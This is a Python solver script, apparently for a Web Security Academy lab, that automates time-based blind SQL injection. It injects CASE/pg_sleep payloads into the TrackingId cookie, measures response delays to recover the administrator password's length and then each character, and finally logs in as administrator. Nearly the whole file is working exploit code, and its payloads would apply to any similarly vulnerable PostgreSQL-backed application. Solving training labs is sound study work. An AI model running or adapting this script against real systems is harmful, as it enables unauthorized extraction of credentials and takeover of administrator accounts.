from web_security_academy.core.utils import *
from bs4 import BeautifulSoup

import string
import time


def solve_lab(session):
    print_info(
        f'Determining the length of the administrator password by visiting "/" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
    )

    len_pass = 1
    while True:
        cookies = {
            "TrackingId": f"' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={len_pass}) THEN pg_sleep(10) ELSE pg_sleep(0) END --"
        }

        start = time.perf_counter()
        session.get_path("/", cookies=cookies)
        end = time.perf_counter()
        response_time = end - start

        if response_time < 10:
            print_info_secondary(f"{len_pass} => {response_time:.2f} seconds", end="")
            len_pass += 1
        else:
            print_success(f"{len_pass} => {response_time:.2f} seconds\n")
            break

    print_info(
        f'Determining administrator password by visting "/" with the following cookies:'
    )
    print(
        '{"TrackingId": "\' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
    )
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""

    for i in range(len_pass):
        for c in alphabet:
            cookies = {
                "TrackingId": f"' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), {i+1}, 1)='{c}') THEN pg_sleep(10) ELSE pg_sleep(0) END --"
            }
            start = time.perf_counter()
            session.get_path("/", cookies=cookies)
            end = time.perf_counter()
            response_time = end - start

            if response_time < 10:
                print_info_secondary(
                    f"{i+1}, '{c}' => {response_time:.2f} | Progress: {password}...",
                    end="",
                )
            else:
                print_success(
                    f"{i+1}, '{c}' => {response_time:.1f} | Progress: {password}...",
                    end="",
                )
                password += c
                break
        else:
            print()
            print_fail(f"Unable to determine character at index {i}")

    print()
    print_success(f"Successfully extracted administrator password: {password}\n")

    session.login("administrator", password)
